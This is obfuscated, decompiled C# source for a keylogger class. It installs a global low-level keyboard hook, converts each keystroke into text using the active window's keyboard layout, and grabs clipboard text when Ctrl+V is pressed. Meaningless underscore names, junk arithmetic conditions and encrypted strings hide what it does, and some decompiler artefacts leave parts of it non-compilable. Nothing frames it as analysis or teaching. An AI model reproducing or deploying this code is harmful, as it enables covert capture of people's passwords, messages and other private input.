using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class ________________________________________
{
	public delegate void ___________________________________________(Keys keys_0);

	public delegate void ____________________________________________(Keys keys_0);

	public delegate void _____________________________________________(string string_0);

	private delegate int __________________________________________(int int_0, int int_1, ref ________________________________________._________________________________________ __________________________________________0);

	private struct _________________________________________
	{
		public int _;

		public int __;

		public int ___;

		public int ____;

		public int _____;
	}

	private static int ____;

	private static ________________________________________.__________________________________________ _____;

	public event ________________________________________.___________________________________________ _
	{
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		add
		{
			this._ = (________________________________________.___________________________________________)System.Delegate.Combine(this._, value);
		}
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		remove
		{
			this._ = (________________________________________.___________________________________________)System.Delegate.Remove(this._, value);
		}
	}

	public event ________________________________________.____________________________________________ __
	{
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		add
		{
			this.__ = (________________________________________.____________________________________________)System.Delegate.Combine(this.__, value);
		}
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		remove
		{
			this.__ = (________________________________________.____________________________________________)System.Delegate.Remove(this.__, value);
		}
	}

	public event ________________________________________._____________________________________________ ___
	{
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		add
		{
			this.___ = (________________________________________._____________________________________________)System.Delegate.Combine(this.___, value);
		}
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		remove
		{
			this.___ = (________________________________________._____________________________________________)System.Delegate.Remove(this.___, value);
		}
	}

	[System.Runtime.InteropServices.DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int int_0, ________________________________________.__________________________________________ ___________________________________________0, int int_1, int int_2);

	[System.Runtime.InteropServices.DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CallNextHookEx(int int_0, int int_1, int int_2, ________________________________________._________________________________________ __________________________________________0);

	[System.Runtime.InteropServices.DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int int_0);

	[System.Runtime.InteropServices.DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int int_0, [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.AnsiBStr)] ref string string_0, int int_1);

	[System.Runtime.InteropServices.DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern System.IntPtr GetForegroundWindow();

	[System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern System.IntPtr GetModuleHandle(string string_0);

	[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
	private static extern int GetWindowThreadProcessId(System.IntPtr intptr_0, ref int int_0);

	public void ______________()
	{
		try
		{
			________________________________________._____ = new ________________________________________.__________________________________________(this._______________);
			________________________________________.____ = ________________________________________.SetWindowsHookExA(13, ________________________________________._____, (int)System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]), 0);
			if (________________________________________.____ == 0)
			{
				System.IntPtr value = (System.IntPtr)Conversions.ToLong(System.Environment.GetCommandLineArgs()[1]);
				________________________________________._____ = new ________________________________________.__________________________________________(this._______________);
				________________________________________.____ = ________________________________________.SetWindowsHookExA(13, ________________________________________._____, (int)value, 0);
			}
		}
		catch (System.Exception arg_80_0)
		{
			ProjectData.SetProjectError(arg_80_0);
			ProjectData.ClearProjectError();
		}
	}

	private int _______________(int int_0, int int_1, ref ________________________________________._________________________________________ __________________________________________0)
	{
		int num;
		int num3;
		int num4;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			if (int_0 == 0)
			{
				if (sizeof(uint) + 17314 == 19099)
				{
					goto IL_A3;
				}
				IL_25:
				num2 = 3;
				________________________________________.___________________________________________ __________________________________________;
				int arg_5C_0;
				switch (int_1)
				{
				case 256:
				case 260:
					IL_79:
					num2 = 7;
					__________________________________________ = this._;
					if (__________________________________________ == null)
					{
						goto IL_AF;
					}
					arg_5C_0 = sizeof(byte) + -1;
					break;
				case 257:
				case 261:
					IL_4E:
					num2 = 10;
					arg_5C_0 = checked((int)2.0);
					break;
				case 258:
				case 259:
					goto IL_AF;
				default:
					goto IL_AF;
				}
				switch (arg_5C_0)
				{
				case 0:
					IL_A3:
					__________________________________________((Keys)__________________________________________0._);
					break;
				case 1:
					goto IL_79;
				case 2:
				{
					________________________________________.____________________________________________ ___________________________________________ = this.__;
					if (___________________________________________ != null)
					{
						___________________________________________((Keys)__________________________________________0._);
					}
					break;
				}
				default:
					goto IL_79;
				}
			}
			IL_AF:
			num2 = 13;
			num3 = ________________________________________.CallNextHookEx(________________________________________.____, int_0, int_1, __________________________________________0);
			IL_CB:
			goto IL_158;
			IL_D0:
			int arg_D5_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_D5_0);
			IL_116:
			goto IL_14D;
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_12A:
			goto IL_14D;
		}
		object arg_12C_0;
		endfilter(arg_12C_0 is System.Exception & num != 0 & num4 == 0);
		IL_14D:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_158:
		int arg_161_0 = num3;
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return arg_161_0;
	}

	public string ________________(Keys keys_0)
	{
		bool flag = false;
		string result;
		try
		{
			if (-7570 != System.Type.EmptyTypes.Length + -7571)
			{
				int num;
				int _________;
				int num2;
				int num3;
				while (true)
				{
					flag = _____________._.Keyboard.ShiftKeyDown;
					if (!_____________._.Keyboard.CapsLock)
					{
						goto IL_BE;
					}
					if (sizeof(short) + 8684 != 8686)
					{
						goto Block_19;
					}
					goto IL_96;
					IL_DE:
					if (keys_0 == Keys.F6 || keys_0 == Keys.F7 || keys_0 == Keys.F8)
					{
						goto IL_676;
					}
					if (num != 5182)
					{
						goto Block_17;
					}
					if ((887 & _________ * 816128) != 0)
					{
						goto Block_18;
					}
					continue;
					IL_BE:
					num = 30402;
					if (_____________._.Keyboard.CtrlKeyDown)
					{
						goto Block_13;
					}
					if (keys_0 == Keys.F1 || keys_0 == Keys.F2)
					{
						goto IL_676;
					}
					num = -9029;
					if ((((6144 & num2 / 16 & (num2 / 5398644 ^ 8668)) == 0) ? 5978 : (System.Type.EmptyTypes.Length + -1471801026)) == 420)
					{
						goto IL_DE;
					}
					if (keys_0 == Keys.F3 || keys_0 == Keys.F4 || keys_0 == Keys.F5)
					{
						goto IL_676;
					}
					num3 = num;
					num = 31054;
					if (num3 == -9029)
					{
						goto IL_DE;
					}
					IL_96:
					if (flag)
					{
						flag = false;
						goto IL_BE;
					}
					flag = true;
					num = 30402;
					if (System.Type.EmptyTypes.Length + 23401 != 23401)
					{
						goto IL_DE;
					}
					goto IL_BE;
				}
				while (true)
				{
					IL_3C2:
					int arg_3C2_0;
					switch (arg_3C2_0)
					{
					case 0:
						goto IL_3E4;
					case 1:
						goto IL_316;
					case 2:
						if (keys_0 != Keys.Shift && keys_0 != Keys.ShiftKey && keys_0 != Keys.Control)
						{
							num = System.Type.EmptyTypes.Length + -11143;
							arg_3C2_0 = System.Type.EmptyTypes.Length + 1;
							continue;
						}
						goto IL_526;
					case 3:
					{
						if (keys_0 == Keys.Return)
						{
							goto Block_31;
						}
						if (keys_0 != Keys.Tab)
						{
							goto IL_45B;
						}
						num = -22203;
						int ______________ = <Module>._______________;
						if (((~(-(______________ * -1503395840)) != 262144 * ______________) ? -474 : (System.Type.EmptyTypes.Length + -1428370030)) == 25251)
						{
							goto IL_316;
						}
						if (_______________________________________.__ != keys_0)
						{
							goto IL_3F5;
						}
						result = <Module>.__________(System.Type.EmptyTypes.Length + 50484, System.Type.EmptyTypes.Length + 50699, System.Type.EmptyTypes.Length + 242);
						if ((_________ + _________ * 3 | -2) == -2)
						{
							if (num == -24067)
							{
								goto IL_316;
							}
						}
						break;
					}
					case 5:
						if (keys_0 == Keys.F12 || keys_0 == Keys.End)
						{
							goto IL_676;
						}
						if (keys_0 == Keys.Delete)
						{
							goto Block_28;
						}
						if (keys_0 != Keys.LShiftKey && keys_0 != Keys.RShiftKey)
						{
							arg_3C2_0 = System.Type.EmptyTypes.Length + 2;
							continue;
						}
						goto IL_526;
					}
					goto Block_53;
					IL_316:
					while (keys_0 != Keys.ControlKey && keys_0 != Keys.RControlKey && keys_0 != Keys.LControlKey)
					{
						if (num != -11143)
						{
							goto Block_40;
						}
						if (8 * num2 - 4701 + 649579720 == -num2 << 3)
						{
							goto Block_41;
						}
						if (keys_0 == Keys.Alt)
						{
							break;
						}
						if (keys_0 == Keys.Space)
						{
							int _____________;
							arg_3C2_0 = ((((uint)(-(uint)(-1358080 * _____________)) >> 8 & 1u) != (uint)(1 & _____________)) ? (sizeof(ulong) + 913001722) : (((151 & -1390 + num3 * 16 + 1008 * num3) != 146) ? (sizeof(ushort) + 1743121200) : (sizeof(ushort) + -2)));
							goto IL_3C2;
						}
						if (keys_0 == Keys.Back)
						{
							num = 32260;
							if (System.Type.EmptyTypes.Length + -12443 != -9535)
							{
								goto Block_45;
							}
						}
						else
						{
							if (keys_0 != Keys.Return)
							{
								arg_3C2_0 = System.Type.EmptyTypes.Length + 3;
								goto IL_3C2;
							}
							goto IL_41C;
						}
					}
					goto IL_526;
				}
				Block_28:
				if (-87703552 * num == -1846826231)
				{
					goto IL_676;
				}
				if (num != -21893)
				{
					goto IL_676;
				}
				goto IL_697;
				Block_31:
				goto IL_41C;
				goto IL_480;
				Block_40:
				Block_41:
				goto IL_406;
				goto IL_526;
				Block_45:
				goto IL_4F0;
				Block_53:
				goto IL_697;
				IL_3E4:
				result = <Module>.___<string>(1199096694u);
				return result;
				IL_3F5:
				result = <Module>._____<string>(434313728u);
				return result;
				IL_41C:
				if (_______________________________________.__ == keys_0)
				{
					result = <Module>.__________(System.Type.EmptyTypes.Length + 17383, 18083, System.Type.EmptyTypes.Length + 17);
					return result;
				}
				result = <Module>._______<string>(1043067638u);
				return result;
				IL_45B:
				if (flag)
				{
					int arg_478_0 = -8874;
					int ________________ = <Module>._________________;
					if ((arg_478_0 | -(________________ << 18)) != -8874)
					{
						goto IL_480;
					}
					result = ________________________________________._________________((uint)keys_0).ToUpper();
					return result;
				}
				else
				{
					result = ________________________________________._________________((uint)keys_0);
					int ________________;
					if ((((6143 | ________________) * 193 + (6143 | ________________) * 831 != 7575) ? (System.Type.EmptyTypes.Length + 28804) : (System.Type.EmptyTypes.Length + -1264206385)) != 22909)
					{
						goto IL_4EB;
					}
				}
				IL_4F0:
				result = <Module>.______<string>(2263034367u);
				return result;
				IL_526:
				int arg_66D_0 = System.Type.EmptyTypes.Length + 4943;
				uint arg_542_0 = 1u;
				num2 = ___________._;
				int arg_66D_1;
				if ((arg_542_0 & (uint)(num2 - 728) >> 2) == (uint)(1 & num2 / 4))
				{
					int arg_55D_0 = 1;
					int num4 = ___________._;
					arg_66D_1 = (((arg_55D_0 & num4 + num4 + 2682) == 0) ? (sizeof(int) + 6178) : ((-(_________ << 30) == -1874483982) ? (System.Type.EmptyTypes.Length + 838701997) : (sizeof(float) + -611690294)));
				}
				else
				{
					int arg_5B2_0 = 6144;
					int _____________ = <Module>.______________;
					if ((arg_5B2_0 & _____________ / 16 & (_____________ / 5398644 ^ 8668)) == 0)
					{
						if (num2 * 392276584 != 1227611933)
						{
							if ((num2 % 443397530 & -536870912) == 0)
							{
								int arg_5F7_0 = 6720;
								int arg_5F6_0 = -5255;
								_________ = <Module>.__________;
								arg_66D_1 = (((arg_5F7_0 + (arg_5F6_0 & _________) ^ -2033253166) != 0) ? 768007366 : (sizeof(ushort) + 809641983));
							}
							else
							{
								arg_66D_1 = sizeof(long) + -2050816193;
							}
						}
						else
						{
							arg_66D_1 = System.Type.EmptyTypes.Length + -1133953397;
						}
					}
					else
					{
						arg_66D_1 = -759032824;
					}
				}
				result = <Module>.__________(arg_66D_0, arg_66D_1, (~(num2 / 299630 % 2048) == -(num2 * 14476) * 262144) ? (System.Type.EmptyTypes.Length + 1028596853) : checked((int)130.0));
				return result;
				Block_13:
				if (keys_0 != Keys.V)
				{
					result = null;
					int arg_3C2_0 = System.Type.EmptyTypes.Length + 4;
					goto IL_3C2;
				}
				if (num != -1942)
				{
					goto IL_406;
				}
				goto IL_480;
				Block_17:
				Block_18:
				goto IL_186;
				Block_19:
				goto IL_4EB;
				IL_186:
				if (keys_0 != Keys.F9 && keys_0 != Keys.F10 && keys_0 != Keys.F11)
				{
					num = System.Type.EmptyTypes.Length + 31768;
					int arg_3C2_0 = System.Type.EmptyTypes.Length + 5;
					goto IL_3C2;
				}
				goto IL_676;
				IL_406:
				result = _____________._.Clipboard.GetText();
				IL_480:
				IL_4EB:
				return result;
				IL_676:
				result = <Module>.__________(checked((int)(unchecked((System.IntPtr)64471))), 65289, System.Type.EmptyTypes.Length + 136);
			}
			IL_697:;
		}
		catch (System.Exception expr_699)
		{
			ProjectData.SetProjectError(expr_699);
			try
			{
				if (flag)
				{
					result = Strings.ChrW((int)keys_0).ToString().ToUpper();
					ProjectData.ClearProjectError();
				}
				else
				{
					result = Strings.ChrW((int)keys_0).ToString().ToLower();
					ProjectData.ClearProjectError();
				}
			}
			catch (System.Exception arg_6DE_0)
			{
				ProjectData.SetProjectError(arg_6DE_0);
				result = null;
				ProjectData.ClearProjectError();
			}
		}
		return result;
	}

	private static string _________________(uint uint_0)
	{
		try
		{
			System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
			byte[] byte_ = new byte[255];
			<Module>._____ = null;
			int ____________ = <Module>._____________;
			string result;
			uint uint_;
			System.IntPtr foregroundWindow;
			if (____________ / 1518670 - -536870912 != ____________ / 1048576 * 256)
			{
				if (!________________________________________.GetKeyboardState(byte_))
				{
					result = <Module>.__________(System.Type.EmptyTypes.Length + 27780, sizeof(byte) + 28334, 90);
					switch (sizeof(double) + -7)
					{
					case 0:
						goto IL_8F;
					case 1:
						IL_7E:
						break;
					}
					goto IL_7E;
				}
				uint_ = ________________________________________.MapVirtualKey(uint_0, 0u);
				foregroundWindow = ________________________________________.GetForegroundWindow();
			}
			IL_8F:
			int num = 0;
			int windowThreadProcessId = ________________________________________.GetWindowThreadProcessId(foregroundWindow, ref num);
			System.IntPtr intptr_ = (System.IntPtr)________________________________________.GetKeyboardLayout(windowThreadProcessId);
			________________________________________.ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, intptr_);
			result = stringBuilder.ToString();
			return result;
		}
		catch (System.Exception expr_C2)
		{
			ProjectData.SetProjectError(expr_C2);
			ProjectData.ClearProjectError();
		}
		return ((Keys)uint_0).ToString();
	}

	[System.Runtime.InteropServices.DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int int_0);

	[System.Runtime.InteropServices.DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] [System.Runtime.InteropServices.Out] System.Text.StringBuilder stringBuilder_0, int int_0, uint uint_2, System.IntPtr intptr_0);

	[System.Runtime.InteropServices.DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[System.Runtime.InteropServices.DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);
}
